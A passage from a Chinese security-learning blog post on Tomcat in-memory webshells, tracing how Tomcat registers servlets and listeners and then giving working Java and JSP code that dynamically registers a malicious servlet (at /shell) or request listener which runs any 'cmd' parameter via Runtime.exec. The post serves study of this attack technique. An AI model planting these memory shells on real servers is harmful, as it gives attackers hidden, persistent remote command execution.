<p>现在的wrapper建立载入了servletname和指定加载的全类名之后，被add到了standardcontext中<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/33.png"><br>其实上述过程就是在读取web.xml中的信息的过程<br>根据servlet的结构来一步一步加载进去<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/34.png"><br>servletmapping的加载则是在后面<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/35.png"></p>
<p>到这里其实servlet的注册已经完毕了，我们总结一下servlet动态创建的条件</p>
<ul>
<li>通过context.createWrapper()方法创建wrapper对象</li>
<li>设置servlet的name属性</li>
<li>设置servlet的全类名</li>
<li>设置servletmapping，也就是url路径和servlet对应关系</li>
<li>然后将装载了servlet信息的wrapper通过addchild方法添加到context中</li>
</ul>
<p>经历过这些进程之后就算是注册完毕了，但是还没有实例化servlet，这个只能等我们去访问路径的时候才会实例化这个servlet，这也被称为servlet的懒加载机制，这个机制的主要方法loadOnStartup()实关于属性值loadOnStartUp的设置，当我们的这个属性值大于等于0时，表示我们这个容器现在正在被访问，需要加载servlet，正数值越小，启动的优先级越高</p>
<h3 id="Servlet内存马编写"><a href="#Servlet内存马编写" class="headerlink" title="Servlet内存马编写"></a>Servlet内存马编写</h3><p>收束一下前文的关系，我们跟进了正式访问servlet之前的流程，也就是connector的工作。<br>然后直接来到了通过web.xml注册servlet的地方，了解到了servlet的几个注册条件，主要是创建了一个wrapper包含了我们servlet的该有的信息把他放到了standardContext中</p>
<p>所以接下来的工作：<br>创建好带有恶意servlet信息的wrapper，然后将其add到standardContext的child中<br>然后设置好servlet与路由的mapping</p>
<h4 id="java实现"><a href="#java实现" class="headerlink" title=".java实现"></a>.java实现</h4><pre><code class="java">import org.apache.catalina.Wrapper;  
import org.apache.catalina.connector.Request;  
import org.apache.catalina.core.StandardContext;  
  

import javax.servlet.*;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.IOException;  
import java.lang.reflect.Field;  
  
public class Evilservlet implements Servlet &#123;  
@Override  
public void init(ServletConfig servletConfig) throws ServletException &#123;  
  
&#125;  
  
@Override  
public ServletConfig getServletConfig() &#123;  
return null;  
&#125;  
  
@Override  
public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;  

//这里两个try是为了得到standardcontext
Field reqF = null;  
try &#123;  
reqF = servletRequest.getClass().getDeclaredField(&quot;request&quot;);  
&#125; catch (NoSuchFieldException e) &#123;  
e.printStackTrace();  
&#125;  
reqF.setAccessible(true);  
Request req = null;  
try &#123;  
req = (Request) reqF.get(servletRequest);  
&#125; catch (IllegalAccessException e) &#123;  
e.printStackTrace();  
&#125;  
StandardContext standardContext = (StandardContext) req.getContext();  

//将我们的Evilservlet恶意servlet的配置信息 全类名以及名字 URL对应都配置进wrappper
//调用standardcontext的addchild将刚才配置好的wrapper存入
Evilservlet servletShell = new Evilservlet();  
String name = servletShell.getClass().getSimpleName();  
  
Wrapper wrapper = standardContext.createWrapper();  
wrapper.setLoadOnStartup(1);  
wrapper.setName(name);  
wrapper.setServlet(servletShell);  
wrapper.setServletClass(servletShell.getClass().getName());  
standardContext.addChild(wrapper);  
standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);  
  
String cmd = servletRequest.getParameter(&quot;cmd&quot;);  
if (cmd !=null)&#123;  
try&#123;  
Runtime.getRuntime().exec(cmd);  
&#125;catch (IOException e)&#123;  
e.printStackTrace();  
&#125;catch (NullPointerException n)&#123;  
n.printStackTrace();  
&#125;  
&#125;  
&#125;  
  
@Override  
public String getServletInfo() &#123;  
return null;  
&#125;  
  
@Override  

public void destroy() &#123;  
  
&#125;  
  
public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) &#123;  
HttpServletResponse var2 = null;  
  
try &#123;  
Field var3 = var1.getClass().getDeclaredField(&quot;response&quot;);  
var3.setAccessible(true);  
var2 = (HttpServletResponse)var3.get(var1);  
&#125; catch (Exception var8) &#123;  
try &#123;  
Field var4 = var1.getClass().getDeclaredField(&quot;request&quot;);  
var4.setAccessible(true);  
Object var5 = var4.get(var1);  
Field var6 = var5.getClass().getDeclaredField(&quot;response&quot;);  
var6.setAccessible(true);  
var2 = (HttpServletResponse)var6.get(var5);  
&#125; catch (Exception var7) &#123;  
&#125;  
&#125;  
  
return var2;  
&#125;  
&#125;
</code></pre>
<p>这个版本的poc版本高了好像会报500的错，这里不是很推荐，只用于理解servlet写马的整体思路</p>
<p>接下来写JSP形式的</p>
<h4 id="jsp实现"><a href="#jsp实现" class="headerlink" title=".jsp实现"></a>.jsp实现</h4><pre><code class="java">
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;  
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;  
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;  
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;  
&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%--  
Created by IntelliJ IDEA.  
User: stoocea  
Date: 2023/11/22  
Time: 19:46  
To change this template use File | Settings | File Templates.  
--%&gt;  
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;  
&lt;html&gt;  
&lt;head&gt;  
&lt;title&gt;Title&lt;/title&gt;  
&lt;/head&gt;  
&lt;body&gt;  
&lt;%--首先获取到standContext对象 --%&gt;&lt;%  
Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);  
reqF.setAccessible(true);  
Request req = (Request) reqF.get(request);  
StandardContext standardContext = (StandardContext) req.getContext();  
%&gt;  
  
&lt;%--编写恶意servlet--%&gt;  
&lt;%!  
public class Shell_Servlet implements Servlet &#123;  
@Override  
public void init(ServletConfig servletConfig) throws ServletException &#123;  
  
&#125;  
  
@Override  
public ServletConfig getServletConfig() &#123;  
return null;  
&#125;  
  
@Override  
public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;  
String cmd= servletRequest.getParameter(&quot;cmd&quot;);  
if(cmd!=null)&#123;  
try&#123;
Runtime.getRuntime().exec(cmd);  
  
&#125; catch (IOException e) &#123;  
throw new RuntimeException(e);  
&#125;  
&#125;  
&#125;  
  
@Override  
public String getServletInfo() &#123;  
return null;  
&#125;  
  
@Override  
public void destroy() &#123;  
  
&#125;  
&#125;  
%&gt;  
  
&lt;%--创建wrapper对象 装载恶意servlet对象的配置信息--%&gt;  
&lt;%  
Shell_Servlet shellServlet=new Shell_Servlet();  
String name=shellServlet.getClass().getSimpleName();  
Wrapper wrapper=standardContext.createWrapper();  
wrapper.setName(name);  
wrapper.setServlet(shellServlet);  
wrapper.setServletClass(shellServlet.getClass().getName());  
  
%&gt;  
  
&lt;%--将wrapper添加进standardContext，并设置mapping-路由与servlet的键值对--%&gt;  
&lt;%  
standardContext.addChild(wrapper);  
standardContext.addServletMappingDecoded(&quot;/servletshell&quot;,name);  
  
%&gt;  
&lt;/body&gt;  
&lt;/html&gt;

</code></pre>
<p>整体的思路跟着注释<br>先访问evilservlet.jsp文件生成内存马<br>然后访问我们的指定路由就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/36.png"></p>
<h2 id="listener型内存马"><a href="#listener型内存马" class="headerlink" title="listener型内存马"></a>listener型内存马</h2><p>首先回顾一下什么是listener？<br>在java web的开发过程中，listener其实总结起来就是Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。<br>再说直白一点就是可以用监听器听客户端的请求，以及服务端的操作，然后也能够代码执行</p>
<p>关于Listener监听作用实现的三个对象 </p>
<ul>
<li>ServletContextListener</li>
<li>HttpSessionListener</li>
<li>ServletRequestListener</li>
</ul>
<p>其实体验下来，listener是最适合做内存马的，之后再说具体原因</p>
<h3 id="Listener基础代码实现以及流程分析"><a href="#Listener基础代码实现以及流程分析" class="headerlink" title="Listener基础代码实现以及流程分析"></a>Listener基础代码实现以及流程分析</h3><h4 id="基础代码实现"><a href="#基础代码实现" class="headerlink" title="基础代码实现"></a>基础代码实现</h4><p>想要实现Listener的功能，就必须实现EventListener这个接口<br>综合他的实现类来看，跟我们tomcat服务器关系紧密，且很容易实现的类，我们可以采用<code>ServletRequestListener</code> 这个类来写马<br>我们看到这个类的定义内容</p>
<p>有一段方法非常引人瞩目，如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/37.png"></p>
<p>根据定义，其实他监控了所有请求的生成，也就是我们往对应路径发送请求时，对应的listener就会触发这个方法</p>
<p>这里我们自己创建一个Listener，设定访问路径以及web.xml</p>
<pre><code class="java">import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
import javax.servlet.annotation.WebListener;  
  
@WebListener(&quot;/listenerTest&quot;)  
public class ListenerTest implements ServletRequestListener &#123;  
  
@Override  
public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;  
  
&#125;  
  
@Override  
public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;  
System.out.println(&quot;Listener 被调用&quot;);  
&#125;  
&#125;
</code></pre>
<pre><code class="xml">&lt;listener&gt;  
&lt;listener-class&gt;ListenerTest&lt;/listener-class&gt;  
&lt;/listener&gt;
</code></pre>
<p>只要我们访问对应路径就会触发requestInitialized方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/38.png"></p>
<h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><p>listener的配置信息都是通过web.xml读取的，所以我们要去找实现了读取web.xml文件内容的类与方法<br>在ContextConfig类下的configureContext方法(<br>其实不只是listener,我们之前分析的filter和servlet都要通过web.xml的内容去配置<br>configureContext这个方法都一一实现了)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/39.png"><br>发现读取完之后会调用standContext的<code>addApplicationListener()</code></p>
<p>我们继续跟进</p>
<p>发现这里并没有实质性的添加listener,它只是将这个Listener的类名添加进了Application<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/40.png"><br>实际上,真正添加进有效listener的方法是之后standardContext的addApplicationEventListener方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/41.png"><br>你会发现它只有一个参数,而且就是我们的listener实体<br>那其实我们自己构造的listener内存马实现条件就很容易实现了,写一个恶意Listener类,之后实例化后直接调用addApplicationEventListener即可<br>POC如下</p>
<pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;  
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;  
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;  
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%--  
Created by IntelliJ IDEA.  
User: ASUS  
Date: 2023/11/23  
Time: 12:02  
To change this template use File | Settings | File Templates.  
--%&gt;  
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;  
&lt;html&gt;  
&lt;head&gt;  
&lt;title&gt;Title&lt;/title&gt;  
&lt;/head&gt;  
&lt;body&gt;  
&lt;%--获取到standardContext--%&gt;  
&lt;%  
Field reqF=request.getClass().getDeclaredField(&quot;request&quot;);  
reqF.setAccessible(true);  
Request req=(Request) reqF.get(request);  
StandardContext context =(StandardContext) req.getContext();  
%&gt;  
  
&lt;%--撰写恶意类--%&gt;  
&lt;%!  
public class Shell_Listener implements ServletRequestListener&#123;  
@Override  
public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;  
  
&#125;  
  
@Override  
public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;  
HttpServletRequest request=(HttpServletRequest) servletRequestEvent.getServletRequest();  
String cmd=request.getParameter(&quot;cmd&quot;);  
if(cmd!=null)&#123;  
try&#123;  
Runtime.getRuntime().exec(cmd);  
&#125;catch (IOException e)&#123;  
e.printStackTrace();  
&#125;  
&#125;  
&#125;  
&#125;  
  
%&gt;  
  
&lt;%--最后调用addApplicationEventListener，添加我们的恶意listener--%&gt;  
&lt;%  
  
Shell_Listener shell_listener=new Shell_Listener();  
context.addApplicationEventListener(shell_listener);  
  
%&gt;
</code></pre>
<p>访问JSP文件后,之后任意请求都能触发监听器了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/42.png"></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">stoocea</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html')">tomcat内存马学习（未完全）</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=undefined&amp;url=http://example.com/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html&amp;pic=undefined" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">stoocea</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">FastJson反序列化学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description">time thicking away</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%89%8D%E7%9A%84%E5%B0%8F%E8%A1%A5%E5%85%85"><span class="toc-number">1.</span> <span class="toc-text">测试前的小补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">Filter型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FIlter%E6%B3%A8%E5%86%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text">FIlter注册方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter%E6%B3%A8%E5%86%8C%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.2.</span> <span class="toc-text">filter注册探索</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#addfilter%E7%9A%84%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.2.1.</span> <span class="toc-text">addfilter的探索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filterchain%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.2.2.</span> <span class="toc-text">Filterchain探索</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E5%89%8D%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">实现前的流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dofilter%E4%B9%8B%E5%90%8E"><span class="toc-number">2.3.1.</span> <span class="toc-text">dofilter之后</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEdofilter%E4%B9%8B%E5%89%8D"><span class="toc-number">2.3.2.</span> <span class="toc-text">访问dofilter之前</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8A%E6%B5%81%E7%A8%8B%E7%9A%84addfilter"><span class="toc-number">2.3.3.</span> <span class="toc-text">接上流程的addfilter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">2.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">servlet型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%88%9B%E5%BB%BA%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">Servlet创建流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-number">3.2.</span> <span class="toc-text">Servlet内存马编写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#java%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.2.1.</span> <span class="toc-text">.java实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jsp%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.2.2.</span> <span class="toc-text">.jsp实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text">listener型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener%E5%9F%BA%E7%A1%80%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">Listener基础代码实现以及流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.1.1.</span> <span class="toc-text">基础代码实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">4.1.2.</span> <span class="toc-text">流程分析</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html" title="tomcat内存马学习（未完全）">tomcat内存马学习（未完全）</a><time datetime="2023-11-23T09:50:51.000Z" title="发表于 2023-11-23 17:50:51">2023-11-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" title="FastJson反序列化学习">FastJson反序列化学习</a><time datetime="2023-11-10T03:09:51.000Z" title="发表于 2023-11-10 11:09:51">2023-11-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/JNDI%E6%B3%A8%E5%85%A5.html" title="JNDI初步学习">JNDI初步学习</a><time datetime="2023-11-01T17:37:51.000Z" title="发表于 2023-11-02 01:37:51">2023-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/RMI%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93.html" title="RMI的基本攻击方式总结">RMI的基本攻击方式总结</a><time datetime="2023-10-24T15:35:51.000Z" title="发表于 2023-10-24 23:35:51">2023-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/blog%E8%BF%81%E7%A7%BB%E5%8A%A8%E6%80%81%E4%BB%A5%E5%8F%8A%E6%9C%80%E8%BF%91%E7%9A%84%E4%BA%8B.html" title="blog迁移动态以及最近的事">blog迁移动态以及最近的事</a><time datetime="2023-08-15T12:31:51.000Z" title="发表于 2023-08-15 20:31:51">2023-08-15</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="stoocea" target="_blank">stoocea</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont 